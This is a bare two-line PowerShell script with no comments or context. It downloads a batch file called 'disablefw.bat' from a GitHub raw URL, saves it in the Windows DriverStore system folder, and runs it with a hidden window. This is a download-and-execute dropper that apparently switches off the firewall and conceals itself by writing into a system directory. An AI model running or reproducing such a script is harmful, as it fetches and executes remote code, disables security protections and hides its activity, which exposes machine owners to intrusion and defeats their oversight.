#
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/nguyenmanmkt/repo1/main/disablefw.bat" -OutFile "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat"
Start-Process -FilePath "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat" -WindowStyle Hidden -NoNewWindow
